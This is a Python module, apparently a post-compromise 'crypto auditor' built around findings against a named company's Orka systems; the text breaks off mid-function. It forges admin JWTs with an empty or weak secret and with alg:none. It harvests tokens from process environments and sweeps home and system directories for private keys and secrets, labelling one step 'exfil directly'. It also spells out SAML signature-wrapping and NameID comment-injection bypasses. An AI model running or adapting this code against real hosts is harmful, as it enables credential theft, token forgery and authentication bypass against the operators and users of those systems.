#!/usr/bin/env python3
"""
Cryptographic Weakness Auditor
Synthesized from: MacStadium Orka post-compromise findings

Audit cryptographic posture on a compromised host — JWTs, SAML assertions,
key material, TLS endpoints, and process environment secrets.

Confirmed context driving this module:
  F-JWT  Orka engine JWT signed with empty string secret (""), HS256, admin@macstadium.com
  F-SAML Cisco ASA SAML SSO (MacStadium-SSO-VPN → Azure AD) — assertion wrapping risk
  F-KEY  LicenseSpring shared_key hardcoded in orka-engine binary (F105)
  F-TLS  Orka API servers on internal 10.221.188.0/24; TLS posture unverified
"""

import base64
import hashlib
import hmac
import json
import os
import re
import socket
import ssl
import struct
import subprocess
import time
import xml.etree.ElementTree as ET
from datetime import datetime, timezone
from pathlib import Path

try:
    import urllib.request
    import urllib.error
    _HAS_URLLIB = True
except ImportError:
    _HAS_URLLIB = False


# ── Known-weak JWT secrets ────────────────────────────────────────────────────
# Ordered by observed frequency in production credential leaks
JWT_WEAK_SECRETS = [
    "",           # Empty string — confirmed in MacStadium Orka engine (F-JWT)
    "secret",
    "password",
    "admin",
    "key",
    "test",
    "changeme",
    "12345",
    "123456",
    "1234567890",
    "your-256-bit-secret",
    "your-secret-key",
    "jwt_secret",
    "jwt-secret",
    "supersecret",
    "qwerty",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
]

# ── Path sets ─────────────────────────────────────────────────────────────────
# Common credential / key-material locations on macOS + Linux
CREDENTIAL_SCAN_PATHS = [
    "/etc",
    "/opt",
    "/usr/local/etc",
    "/var",
    "/tmp",
    "/private/etc",          # macOS
    "/private/var",          # macOS
    "/Library/Application Support",  # macOS
    "/Users",
    "/home",
    "/root",
]

# Extensions that routinely carry key material
KEY_MATERIAL_EXTENSIONS = {
    ".pem", ".key", ".crt", ".cer", ".p12", ".pfx",
    ".jks", ".keystore", ".env", ".secret", ".secrets",
    ".credential", ".credentials", ".token",
}

# Filename patterns that routinely carry key material (basename match)
KEY_MATERIAL_FILENAMES = {
    "id_rsa", "id_ecdsa", "id_ed25519", "id_dsa",
    "credentials.json", "credentials.yaml", "credentials.yml",
    "service_account.json", "serviceaccount.json",
    ".env", ".env.local", ".env.production",
    "secrets.json", "secrets.yaml", "secrets.yml",
    "config.json", "config.yaml", "config.yml",
    "settings.json", "settings.yaml", "settings.yml",
    "kubeconfig", ".kubeconfig",
    "vault-token", ".vault-token",
}

# Regex patterns for hardcoded secrets in config files (value length >= 16)
SECRET_PATTERNS = [
    re.compile(r'(?i)(?:api[_-]?key|apikey)\s*[=:]\s*["\']?([A-Za-z0-9_\-]{16,})["\']?'),
    re.compile(r'(?i)(?:secret|private[_-]?key|secret[_-]?key)\s*[=:]\s*["\']?([A-Za-z0-9_\-+/=]{16,})["\']?'),
    re.compile(r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\']?([^\s"\']{8,})["\']?'),
    re.compile(r'(?i)(?:token|access[_-]?token|auth[_-]?token)\s*[=:]\s*["\']?([A-Za-z0-9_\-\.]{20,})["\']?'),
    re.compile(r'(?i)(?:private[_-]?key|rsa[_-]?key)\s*[=:]\s*["\']?([A-Za-z0-9_\-+/=]{32,})["\']?'),
]

# PEM header markers for private key detection
PEM_PRIVATE_HEADERS = [
    b"-----BEGIN RSA PRIVATE KEY-----",
    b"-----BEGIN OPENSSH PRIVATE KEY-----",
    b"-----BEGIN EC PRIVATE KEY-----",
    b"-----BEGIN PRIVATE KEY-----",
    b"-----BEGIN ENCRYPTED PRIVATE KEY-----",
    b"-----BEGIN DSA PRIVATE KEY-----",
]

# JWT regex — 3 base64url segments; middle must be >= 10 chars
JWT_PATTERN = re.compile(
    r'(?<![A-Za-z0-9_\-])'              # no lead alphanum
    r'([A-Za-z0-9_\-]{10,})'           # header
    r'\.'
    r'([A-Za-z0-9_\-]{10,})'           # payload
    r'\.'
    r'([A-Za-z0-9_\-]*)'               # signature (may be empty for alg:none)
    r'(?![A-Za-z0-9_\-])'              # no trail alphanum
)

# TLS vuln thresholds
TLS_DEPRECATED_PROTOCOLS = {"TLSv1", "TLSv1.0", "TLSv1.1", "SSLv2", "SSLv3"}
TLS_CRITICAL_CIPHERS_RE  = re.compile(r'(?i)(RC4|3DES|DES|EXPORT|NULL|ANON|ADH|AECDH)')
TLS_MIN_RSA_BITS         = 2048
TLS_MIN_EC_BITS          = 256


# ── Helpers ───────────────────────────────────────────────────────────────────

def b64url_decode(s: str) -> bytes:
    """Base64url decode with correct padding."""
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - (len(s) % 4)
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def b64url_encode(b: bytes) -> str:
    """Base64url encode, no padding."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def forge_jwt(payload: dict, secret: str = "", alg: str = "HS256") -> str:
    """
    Forge a JWT using stdlib only (hmac, hashlib, json, base64).
    Supports HS256 and alg:none.
    """
    if alg == "none":
        header = {"alg": "none", "typ": "JWT"}
        h_enc  = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p_enc  = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        return f"{h_enc}.{p_enc}."

    if alg == "HS256":
        header = {"alg": "HS256", "typ": "JWT"}
        h_enc  = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p_enc  = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        sig    = hmac.new(
            secret.encode("utf-8"),
            f"{h_enc}.{p_enc}".encode("utf-8"),
            hashlib.sha256,
        ).digest()
        return f"{h_enc}.{p_enc}.{b64url_encode(sig)}"

    raise ValueError(f"Unsupported alg: {alg}")


def _read_proc_environ(pid_dir: Path) -> str:
    """Read /proc/<pid>/environ for a given process directory."""
    try:
        data = (pid_dir / "environ").read_bytes()
        return data.replace(b"\x00", b"\n").decode("utf-8", errors="replace")
    except Exception:
        return ""


# ── Main class ────────────────────────────────────────────────────────────────

class CryptoAudit:
    """
    Cryptographic weakness auditor for post-compromise host analysis.

    Covers: JWT (decode/forge/weak-secret), SAML (XML parse/wrapping/injection),
    key material (PEM/env/config), TLS (cipher/protocol/cert), and process env.
    """

    def __init__(self):
        self.findings  = []
        self.jwts      = []
        self.keys      = []
        self.tls       = {}

    # ── JWT Analysis ──────────────────────────────────────────────────────────

    def analyze_jwt(self, token: str) -> dict:
        """
        Full JWT analysis: decode header/payload, flag weak alg, test alg:none,
        test empty secret, test known-weak secrets.

        Returns dict with header, payload, alg, vulns list, and forged_token.
        """
        result = {
            "raw":          token,
            "header":       {},
            "payload":      {},
            "alg":          None,
            "vulns":        [],
            "forged_token": None,
        }

        parts = token.split(".")
        if len(parts) != 3:
            result["vulns"].append("MALFORMED: not 3 segments")
            return result

        # Decode header
        try:
            result["header"] = json.loads(b64url_decode(parts[0]))
        except Exception as e:
            result["vulns"].append(f"MALFORMED_HEADER: {e}")
            return result

        # Decode payload
        try:
            result["payload"] = json.loads(b64url_decode(parts[1]))
        except Exception as e:
            result["vulns"].append(f"MALFORMED_PAYLOAD: {e}")
            return result

        alg = result["header"].get("alg", "")
        result["alg"] = alg

        # ── Algorithm checks
        if alg == "none":
            result["vulns"].append(
                "CRITICAL:ALG_NONE — token carries no signature; direct forgery possible"
            )
            # Re-forge to confirm
            forged = forge_jwt(result["payload"], alg="none")
            result["forged_token"] = forged
            self._add_finding(
                "JWT alg:none",
                "CRITICAL",
                "Token uses alg:none — signature is not verified by any conformant implementation",
                f"Subject: {result['payload'].get('sub', 'N/A')} | "
                f"Email: {result['payload'].get('email', 'N/A')}",
                f"Forged token (alg:none):\n{forged}",
            )

        elif alg == "HS256":
            result["vulns"].append("MEDIUM:HS256 — symmetric; secret may be weak or shared")

            # Test empty string secret first (confirmed MacStadium Orka engine)
            if self._verify_hs256(token, ""):
                result["vulns"].append(
                    "CRITICAL:EMPTY_SECRET — token signed with empty string secret"
                )
                forged = forge_jwt(result["payload"], secret="", alg="HS256")
                result["forged_token"] = forged
                self._add_finding(
                    "JWT signed with empty string secret",
                    "CRITICAL",
                    "HS256 token verifies with HMAC-SHA256('', payload) — empty secret confirmed",
                    f"Subject: {result['payload'].get('sub', 'N/A')} | "
                    f"Email: {result['payload'].get('email', result['payload'].get('sub', 'N/A'))}",
                    f"Forge any payload:\n"
                    f"  forge_jwt(payload, secret='', alg='HS256')\n"
                    f"Forged token:\n{forged}",
                )
            else:
                # Test known-weak secrets
                for candidate in JWT_WEAK_SECRETS:
                    if candidate == "":
                        continue
                    if self._verify_hs256(token, candidate):
                        result["vulns"].append(
                            f"CRITICAL:WEAK_SECRET — secret is '{candidate}'"
                        )
                        forged = forge_jwt(result["payload"], secret=candidate, alg="HS256")
                        result["forged_token"] = forged
                        self._add_finding(
                            f"JWT weak secret: '{candidate}'",
                            "CRITICAL",
                            f"HS256 token signed with known-weak secret '{candidate}'",
                            f"Subject: {result['payload'].get('sub', 'N/A')}",
                            f"Forged token:\n{forged}",
                        )
                        break

        elif alg in ("RS256", "RS384", "RS512"):
            result["vulns"].append(
                "INFO:RSA_SIG — check for RS256→HS256 algorithm confusion if server "
                "accepts HS256 with the RSA public key as secret"
            )
            # Test algorithm confusion: forge HS256 with "-----BEGIN PUBLIC KEY-----" as secret
            # We don't have the public key here — flag for manual follow-up
            result["vulns"].append(
                "CHECK:ALG_CONFUSION — attempt RS256→HS256 with server public key as HMAC secret"
            )

        else:
            result["vulns"].append(f"UNKNOWN_ALG:{alg}")

        # ── Expiry checks
        now = int(datetime.now(timezone.utc).timestamp())
        exp = result["payload"].get("exp")
        iat = result["payload"].get("iat")
        nbf = result["payload"].get("nbf")

        if exp:
            if now > exp:
                delta = now - exp
                result["vulns"].append(
                    f"INFO:EXPIRED — token expired {delta}s ago; "
                    "flag if server still accepts (missing exp validation)"
                )
        else:
            result["vulns"].append(
                "MEDIUM:NO_EXP — token has no expiry claim; may be accepted indefinitely"
            )

        if not iat:
            result["vulns"].append("LOW:NO_IAT — no issued-at claim")

        return result

    def _verify_hs256(self, token: str, secret: str) -> bool:
        """Return True if token's signature matches HMAC-SHA256(secret, header.payload)."""
        parts = token.split(".")
        if len(parts) != 3:
            return False
        signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
        expected_sig  = b64url_encode(
            hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
        )
        return hmac.compare_digest(expected_sig, parts[2])

    # ── JWT Scanner ───────────────────────────────────────────────────────────

    def scan_for_jwts(self, paths: list) -> list:
        """
        Walk paths and /proc/*/environ looking for JWT-shaped strings.
        Returns list of dicts: {'token': str, 'source': str}.
        """
        found = []
        seen  = set()

        def _scan_text(text: str, source: str):
            for m in JWT_PATTERN.finditer(text):
                tok = m.group(0)
                if tok in seen:
                    continue
                seen.add(tok)
                found.append({"token": tok, "source": source})

        # Walk provided paths
        for base in paths:
            p = Path(base)
            if not p.exists():
                continue
            try:
                if p.is_file():
                    _scan_text(p.read_text(errors="replace"), str(p))
                    continue
                for fp in p.rglob("*"):
                    if not fp.is_file():
                        continue
                    if fp.stat().st_size > 5 * 1024 * 1024:  # skip >5MB
                        continue
                    try:
                        _scan_text(fp.read_text(errors="replace"), str(fp))
                    except (PermissionError, OSError):
                        pass
            except (PermissionError, OSError):
                pass

        # Scan /proc/*/environ (Linux only)
        proc = Path("/proc")
        if proc.exists():
            for pid_dir in proc.iterdir():
                if not pid_dir.name.isdigit():
                    continue
                env_text = _read_proc_environ(pid_dir)
                if env_text:
                    try:
                        comm = (pid_dir / "comm").read_text().strip()
                    except Exception:
                        comm = pid_dir.name
                    _scan_text(env_text, f"/proc/{pid_dir.name}/environ ({comm})")

        return found

    # ── SAML Analysis ─────────────────────────────────────────────────────────

    def analyze_saml_assertion(self, xml_str: str) -> dict:
        """
        Parse SAML assertion XML (stdlib only) and flag:
          - Unsigned assertions (forgeable)
          - Expired conditions
          - Multiple Assertion elements (signature wrapping)
          - XML comment injection in NameID
        """
        result = {
            "signed":     False,
            "subject":    None,
            "conditions": {},
            "vulns":      [],
        }

        # Parse; if invalid XML flag and return
        try:
            root = ET.fromstring(xml_str)
        except ET.ParseError as e:
            result["vulns"].append(f"PARSE_ERROR:{e}")
            return result

        ns = {
            "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
            "saml":  "urn:oasis:names:tc:SAML:2.0:assertion",
            "ds":    "http://www.w3.org/2000/09/xmldsig#",
        }

        # ── Signature check
        sig_elements = root.findall(".//ds:Signature", ns)
        result["signed"] = len(sig_elements) > 0
        if not result["signed"]:
            result["vulns"].append(
                "CRITICAL:UNSIGNED_ASSERTION — no <ds:Signature> present; "
                "assertion is forgeable by any party"
            )
            self._add_finding(
                "SAML Unsigned Assertion",
                "CRITICAL",
                "SAML assertion carries no <ds:Signature> — any relying party that does not "
                "enforce signature validation will accept a forged assertion",
                f"Assertion root tag: {root.tag}",
                "Craft a new Assertion with arbitrary NameID and send to SP; "
                "if accepted, attacker can authenticate as any user",
            )

        # ── Subject / NameID
        name_id = root.find(".//saml:NameID", ns)
        if name_id is not None:
            result["subject"] = name_id.text

            # XML comment injection: NameID containing <!-- --> can truncate at some parsers
            raw = ET.tostring(name_id, encoding="unicode")
            if "<!--" in raw:
                result["vulns"].append(
                    "HIGH:XML_COMMENT_INJECTION — NameID contains XML comment; "
                    "may truncate username at susceptible SP"
                )
                self._add_finding(
                    "SAML XML Comment Injection in NameID",
                    "HIGH",
                    "NameID element contains XML comment sequence — some parsers strip comments "
                    "before comparison, allowing attacker to inject user@victim.com<!---->@attacker.com",
                    f"Raw NameID: {raw}",
                    "Test: submit assertion with NameID = 'admin<!---->@attacker.com'; "
                    "SP parses as 'admin' while XML is technically well-formed",
                )

        # ── Conditions / expiry
        conditions = root.find(".//saml:Conditions", ns)
        if conditions is not None:
            not_before    = conditions.get("NotBefore")
            not_on_or_after = conditions.get("NotOnOrAfter")
            result["conditions"] = {
                "NotBefore":      not_before,
                "NotOnOrAfter":   not_on_or_after,
            }
            now = datetime.now(timezone.utc)

            if not_on_or_after:
                try:
                    # Remove trailing Z and parse
                    exp_dt = datetime.fromisoformat(not_on_or_after.rstrip("Z")).replace(
                        tzinfo=timezone.utc
                    )
                    if now > exp_dt:
                        delta = int((now - exp_dt).total_seconds())
                        result["vulns"].append(
                            f"MEDIUM:EXPIRED_ASSERTION — expired {delta}s ago; "
                            "flag if SP still accepts (missing condition validation)"
                        )
                except Exception:
                    pass
        else:
            result["vulns"].append(
                "MEDIUM:NO_CONDITIONS — no <saml:Conditions> element; "
                "assertion has no time-bound validity"
            )

        # ── Signature wrapping: multiple Assertion elements
        assertions = root.findall(".//saml:Assertion", ns)
        if len(assertions) > 1:
            result["vulns"].append(
                f"CRITICAL:SIGNATURE_WRAPPING — {len(assertions)} Assertion elements found; "
                "XML Signature Wrapping (XSW) attack may be viable"
            )
            self._add_finding(
                "SAML Signature Wrapping (XSW)",
                "CRITICAL",
                f"Response contains {len(assertions)} <saml:Assertion> elements — "
                "XSW: signed element exists but SP may process an unsigned sibling",
                f"Assertion count: {len(assertions)}",
                "Inject a second Assertion with attacker NameID adjacent to signed assertion; "
                "if SP iterates assertions rather than pinning to the signed one, auth bypass results",
            )

        return result

    # ── Key Material Scanner ──────────────────────────────────────────────────

    def scan_key_material(self, paths: list = None) -> list:
        """
        Scan filesystem paths for PEM private keys, weak RSA keys,
        hardcoded secrets in config files, and known-sensitive filenames.
        """
        if paths is None:
            paths = CREDENTIAL_SCAN_PATHS

        results  = []
        seen_abs = set()

        def _check_file(fp: Path):
            key = str(fp.resolve())
            if key in seen_abs:
                return
            seen_abs.add(key)

            try:
                st = fp.stat()
            except OSError:
                return

            if st.st_size == 0 or st.st_size > 10 * 1024 * 1024:
                return

            # Check by filename
            is_sensitive_name = (
                fp.name in KEY_MATERIAL_FILENAMES
                or fp.suffix.lower() in KEY_MATERIAL_EXTENSIONS
            )

            try:
                raw = fp.read_bytes()
            except (PermissionError, OSError):
                return

            # PEM private key detection
            for header in PEM_PRIVATE_HEADERS:
                if header in raw:
                    key_type = header.decode().replace("-----BEGIN ", "").replace("-----", "").strip()
                    bit_len  = _estimate_rsa_bits(raw)
                    detail   = f"Type: {key_type}"
                    if bit_len:
                        detail += f" | Bits: {bit_len}"
                        if bit_len < TLS_MIN_RSA_BITS:
                            detail += f" WEAK (< {TLS_MIN_RSA_BITS})"
                            self._add_finding(
                                f"Weak RSA Key: {fp}",
                                "HIGH",
                                f"Private key at {fp} is only {bit_len} bits (< {TLS_MIN_RSA_BITS})",
                                detail,
                                f"openssl rsa -in {fp} -text -noout | head -5",
                            )
                    finding = {"path": str(fp), "type": key_type, "detail": detail}
                    results.append(finding)
                    self._add_finding(
                        f"Private Key Found: {fp}",
                        "CRITICAL" if "RSA" in key_type or "OPENSSH" in key_type else "HIGH",
                        f"Readable PEM private key at {fp}",
                        detail,
                        f"cat {fp}  # exfil directly",
                    )
                    return  # one finding per file

            # Hardcoded secret patterns in text files
            if is_sensitive_name or fp.suffix.lower() in {".json", ".yaml", ".yml", ".toml", ".ini", ".conf", ".cfg", ".env"}:
                try:
                    text = raw.decode("utf-8", errors="replace")
                    for pat in SECRET_PATTERNS:
                        for m in pat.finditer(text):
                            secret_val = m.group(1)
                            if len(secret_val) < 8:
                                continue
                            detail = f"Pattern: {pat.pattern[:40]}... | Value: {secret_val[:8]}..."
                            results.append({"path": str(fp), "type": "hardcoded_secret", "detail": detail})
                            self._add_finding(
                                f"Hardcoded Secret in {fp.name}",
                                "HIGH",
                                f"Credential-shaped value in {fp}",
                                detail,
                                f"grep -iE '(api_key|secret|password|token)' {fp}",
                            )
                            break  # one finding per file
                except Exception:
                    pass

        for base_str in paths:
            base = Path(base_str)
            if not base.exists():
                continue
            try:
                if base.is_file():
                    _check_file(base)
                    continue
                # Walk: limit depth to avoid runaway scans
                for fp in base.rglob("*"):
                    if not fp.is_file():
                        continue
                    _check_file(fp)
            except (PermissionError, OSError):
                pass

        return results

    # ── TLS/SSL Analysis ──────────────────────────────────────────────────────

    def analyze_tls(self, host: str, port: int = 443) -> dict:
        """
        Connect to host:port, gather cipher/protocol/cert, flag deprecated
        protocols, weak ciphers, expired certs, self-signed, SHA1, short keys.
        """
        result = {
            "host":         host,
            "port":         port,
            "protocol":     None,
            "cipher":       None,
            "cert_cn":      None,
            "cert_expiry":  None,
            "cert_issuer":  None,
            "cert_sha256":  None,
            "self_signed":  False,
            "vulns":        [],
        }

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE

        try:
            with socket.create_connection((host, port), timeout=5) as raw_sock:
                with ctx.wrap_socket(raw_sock, server_hostname=host) as ssock:
                    cipher_info = ssock.cipher()         # (name, protocol, bits)
                    cert_der    = ssock.getpeercert(binary_form=True)
                    cert_dict   = ssock.getpeercert()    # decoded, no verify

                    proto  = ssock.version()
                    cipher = cipher_info[0] if cipher_info else "unknown"
                    bits   = cipher_info[2] if cipher_info else 0

                    result["protocol"] = proto
                    result["cipher"]   = cipher

                    # Protocol check
                    if proto in TLS_DEPRECATED_PROTOCOLS or (proto and any(d in proto for d in TLS_DEPRECATED_PROTOCOLS)):
                        result["vulns"].append(f"CRITICAL:DEPRECATED_PROTOCOL:{proto}")
                        self._add_finding(
                            f"Deprecated TLS Protocol: {proto}",
                            "CRITICAL",
                            f"{host}:{port} negotiated {proto} — deprecated, known attacks exist",
                            f"Cipher: {cipher} | Bits: {bits}",
                            f"testssl.sh {host}:{port} --protocols",
                        )

                    # Cipher check
                    if TLS_CRITICAL_CIPHERS_RE.search(cipher):
                        result["vulns"].append(f"CRITICAL:WEAK_CIPHER:{cipher}")
                        self._add_finding(
                            f"Weak Cipher Suite: {cipher}",
                            "CRITICAL",
                            f"{host}:{port} negotiated {cipher} — known-broken cipher",
                            f"Protocol: {proto} | Bits: {bits}",
                            f"openssl s_client -connect {host}:{port} -cipher {cipher}",
                        )

                    # Cert analysis
                    if cert_der:
                        sha256_fp = hashlib.sha256(cert_der).hexdigest()
                        result["cert_sha256"] = sha256_fp

                    if cert_dict:
                        # Subject CN
                        subject = dict(x[0] for x in cert_dict.get("subject", []))
                        issuer  = dict(x[0] for x in cert_dict.get("issuer",  []))
                        result["cert_cn"]     = subject.get("commonName")
                        result["cert_issuer"] = issuer.get("commonName")

                        # Self-signed check
                        if subject == issuer:
                            result["self_signed"] = True
                            result["vulns"].append("HIGH:SELF_SIGNED")
                            self._add_finding(
                                f"Self-Signed Certificate: {host}",
                                "HIGH",
                                f"Certificate for {host}:{port} is self-signed — no CA validation possible",
                                f"CN: {result['cert_cn']} | SHA256: {sha256_fp[:16]}...",
                                "Accept risk only for internal endpoints; MITM is trivial on public-facing",
                            )

                        # Expiry check
                        not_after = cert_dict.get("notAfter")
                        if not_after:
                            result["cert_expiry"] = not_after
                            try:
                                exp_dt = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z").replace(
                                    tzinfo=timezone.utc
                                )
                                now_dt = datetime.now(timezone.utc)
                                if now_dt > exp_dt:
                                    result["vulns"].append(
                                        f"HIGH:EXPIRED_CERT — expired {not_after}"
                                    )
                                    self._add_finding(
                                        f"Expired Certificate: {host}",
                                        "HIGH",
                                        f"TLS certificate at {host}:{port} expired {not_after}",
                                        f"CN: {result['cert_cn']}",
                                        "Replace certificate; expired cert breaks chain-of-trust for clients that enforce",
                                    )
                            except Exception:
                                pass

                    ssock.close()

        except ssl.SSLError as e:
            result["vulns"].append(f"SSL_ERROR:{e}")
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            result["vulns"].append(f"CONNECT_ERROR:{e}")

        return result

    # ── Main Audit ────────────────────────────────────────────────────────────

    def audit(self, targets: list = None) -> dict:
        """
        Orchestrate all crypto audits.

        targets — list of host strings for TLS analysis. None = local-only.
        """
        out = {
            "jwts":         [],
            "key_material": [],
            "tls":          {},
            "findings":     self.findings,
        }

        # 1. Scan /proc/*/environ + common paths for JWTs
        jwt_paths = ["/etc", "/opt", "/usr/local/etc", "/var", "/tmp", "/root", "/home"]
        found_jwts = self.scan_for_jwts(jwt_paths)
        for entry in found_jwts:
            analysis = self.analyze_jwt(entry["token"])
            entry["analysis"] = analysis
            out["jwts"].append(entry)

        self.jwts = out["jwts"]

        # 2. Scan key material
        key_findings = self.scan_key_material()
        self.keys     = key_findings
        out["key_material"] = key_findings

        # 3. TLS analysis against provided targets
        if targets:
            for t in targets:
                if ":" in t:
                    host, _, port_str = t.rpartition(":")
                    port = int(port_str)
                else:
                    host = t
                    port = 443
                result = self.analyze_tls(host, port)
                out["tls"][f"{host}:{port}"] = result

        self.tls = out["tls"]
        out["findings"] = self.findings
        return out

    # ── Finding helper ────────────────────────────────────────────────────────

    def _add_finding(
        self,
        ftype: str,
        severity: str,
        description: str,
        detail: str = "",
        exploit: str = "",
    ):
        self.findings.append({
            "type":        ftype,
            "severity":    severity,
            "description": description,
            "detail":      detail,
            "exploit":     exploit,
        })

    # ── Report ────────────────────────────────────────────────────────────────

    def report(self) -> str:
        lines = []
        lines.append("=" * 60)
        lines.append("CRYPTO AUDIT")
        lines.append("=" * 60)

        lines.append(f"\nJWTs scanned:      {len(self.jwts)}")
        lines.append(f"Key material hits: {len(self.keys)}")
        lines.append(f"TLS targets:       {len(self.tls)}")

        if self.jwts:
            lines.append(f"\n--- JWTs ({len(self.jwts)}) ---")
            for entry in self.jwts[:20]:
                a = entry.get("analysis", {})
                lines.append(
                    f"\n  Source:  {entry['source']}"
                    f"\n  Token:   {entry['token'][:60]}..."
                    f"\n  Alg:     {a.get('alg', 'N/A')}"
                    f"\n  Subject: {a.get('payload', {}).get('sub', 'N/A')}"
                )
                for v in a.get("vulns", []):
                    lines.append(f"  VULN:    {v}")
                if a.get("forged_token"):
                    lines.append(f"  FORGED:  {a['forged_token'][:80]}...")

        if self.keys:
            lines.append(f"\n--- Key Material ({len(self.keys)}) ---")
            for k in self.keys[:20]:
                lines.append(f"\n  Path:   {k['path']}")
                lines.append(f"  Type:   {k['type']}")
                if k.get("detail"):
                    lines.append(f"  Detail: {k['detail']}")

        if self.tls:
            lines.append(f"\n--- TLS Analysis ({len(self.tls)}) ---")
            for endpoint, r in self.tls.items():
                lines.append(f"\n  Endpoint: {endpoint}")
                lines.append(f"  Protocol: {r.get('protocol', 'N/A')}")
                lines.append(f"  Cipher:   {r.get('cipher', 'N/A')}")
                lines.append(f"  Cert CN:  {r.get('cert_cn', 'N/A')}")
                lines.append(f"  Expiry:   {r.get('cert_expiry', 'N/A')}")
                for v in r.get("vulns", []):
                    lines.append(f"  VULN:     {v}")

        if self.findings:
            crit  = [f for f in self.findings if f["severity"] == "CRITICAL"]
            high  = [f for f in self.findings if f["severity"] == "HIGH"]
            other = [f for f in self.findings if f["severity"] not in ("CRITICAL", "HIGH")]

            lines.append(
                f"\nFindings: {len(self.findings)} total "
                f"({len(crit)} CRITICAL, {len(high)} HIGH, {len(other)} other)"
            )
            for f in crit + high + other:
                lines.append(f"\n  [{f['severity']}] {f['type']}")
                lines.append(f"  {f['description']}")
                if f.get("detail"):
                    for dl in f["detail"].splitlines():
                        lines.append(f"    {dl}")
                if f.get("exploit"):
                    lines.append(f"  EXPLOIT: {f['exploit'][:140]}")

        return "\n".join(lines)


# ── RSA bit-length estimator ──────────────────────────────────────────────────

def _estimate_rsa_bits(pem_bytes: bytes) -> int | None:
    """
    Estimate RSA key size from PEM bytes without third-party libraries.
    Extracts the DER-encoded integer length from the modulus field.
    Returns bit length or None if unparseable.
    """
    try:
        # Strip PEM headers and decode
        lines = pem_bytes.decode("utf-8", errors="replace").splitlines()
        b64   = "".join(l for l in lines if not l.startswith("-----"))
        der   = base64.b64decode(b64)

        # DER: SEQUENCE { INTEGER (modulus), INTEGER (exponent) }
        # Walk to the modulus integer
        idx = 0
        if der[idx] != 0x30:
            return None
        idx += 1
        # Skip sequence length
        if der[idx] & 0x80:
            n_len_bytes = der[idx] & 0x7F
            idx += 1 + n_len_bytes
        else:
            idx += 1
        # Skip version integer if present (tag 0x02, value 0x00)
        if idx < len(der) and der[idx] == 0x02 and der[idx + 1] == 0x01 and der[idx + 2] == 0x00:
            idx += 3
        # Now at modulus INTEGER tag
        if idx >= len(der) or der[idx] != 0x02:
            return None
        idx += 1
        # Read modulus length
        if der[idx] & 0x80:
            n_len_bytes = der[idx] & 0x7F
            mod_len     = int.from_bytes(der[idx + 1: idx + 1 + n_len_bytes], "big")
            idx += 1 + n_len_bytes
        else:
            mod_len = der[idx]
            idx += 1
        # Skip leading zero byte in modulus if present
        if der[idx] == 0x00:
            mod_len -= 1
        return mod_len * 8
    except Exception:
        return None


# ── Extended crypto analysis ──────────────────────────────────────────────────

class KeyCryptoAnalyzer:
    """
    Extended cryptographic weakness analysis.

    Covers: RSA key inspection (small exponent, short modulus), ECDSA nonce
    reuse detection, X.509 certificate weakness scanning, HTTP timing oracle
    measurement, and hash-based MAC length-extension risk assessment.

    All methods use pure stdlib (ssl, struct, re, datetime, time, urllib).
    """

    def __init__(self):
        self.findings = []

    def _add_finding(self, ftype: str, severity: str, description: str,
                     detail: str = "", exploit: str = ""):
        self.findings.append({
            "type":        ftype,
            "severity":    severity,
            "description": description,
            "detail":      detail,
            "exploit":     exploit,
        })

    # ── DER primitive helpers ─────────────────────────────────────────────────

    @staticmethod
    def _der_length(data: bytes, idx: int):
        """Parse DER/BER definite length at idx. Return (length, next_idx)."""
        b = data[idx]
        if b & 0x80 == 0:
            return b, idx + 1
        n = b & 0x7f
        if n == 0:
            return 0, idx + 1
        length = int.from_bytes(data[idx + 1: idx + 1 + n], "big")
        return length, idx + 1 + n

    @staticmethod
    def _der_tag(data: bytes, idx: int):
        """Read one TLV at idx. Return (tag_byte, value_bytes, next_idx)."""
        tag = data[idx]
        length, idx2 = KeyCryptoAnalyzer._der_length(data, idx + 1)
        return tag, data[idx2: idx2 + length], idx2 + length

    @staticmethod
    def _der_unwrap_seq(data: bytes, idx: int = 0) -> bytes:
        """Assert SEQUENCE (0x30) at idx and return its content bytes."""
        if data[idx] != 0x30:
            raise ValueError(f"Expected SEQUENCE 0x30, got 0x{data[idx]:02x} at {idx}")
        _, content, _ = KeyCryptoAnalyzer._der_tag(data, idx)
        return content

    @staticmethod
    def _der_int(data: bytes, idx: int):
        """Read INTEGER TLV at idx. Return (python_int, next_idx)."""
        if data[idx] != 0x02:
            raise ValueError(f"Expected INTEGER 0x02, got 0x{data[idx]:02x} at {idx}")
        _, val, next_idx = KeyCryptoAnalyzer._der_tag(data, idx)
        # Strip DER sign-extension leading zero
        if val and val[0] == 0x00:
            val = val[1:]
        return int.from_bytes(val, "big"), next_idx

    # ── RSA key analysis ──────────────────────────────────────────────────────

    def analyze_rsa_key(self, key_data: bytes) -> list:
        """
        Parse PEM or DER RSA private key. Extracts modulus n and public
        exponent e via raw ASN.1 parsing (no third-party libs).

        Flags:
          e == 3               → CRITICAL  (Coppersmith/cube-root attack)
          key_bits < 1024      → CRITICAL  (ECM/NFS factorable)
          1024 <= key_bits < 2048 → HIGH   (below NIST minimum)

        Returns list of finding dicts.
        """
        findings = []

        # ── PEM → DER
        try:
            if b"-----BEGIN" in key_data:
                lines = key_data.decode("utf-8", errors="replace").splitlines()
                b64   = "".join(l for l in lines if not l.startswith("-----"))
                der   = base64.b64decode(b64)
            else:
                der = key_data
        except Exception as exc:
            findings.append({"type": "RSA_PARSE_ERROR", "severity": "INFO",
                              "description": f"PEM decode failed: {exc}"})
            return findings

        # ── PKCS#8 unwrap if needed (BEGIN PRIVATE KEY)
        try:
            if b"BEGIN PRIVATE KEY" in key_data:
                der = self._pkcs8_unwrap(der)
        except Exception as exc:
            findings.append({"type": "RSA_PARSE_ERROR", "severity": "INFO",
                              "description": f"PKCS#8 unwrap failed: {exc}"})
            return findings

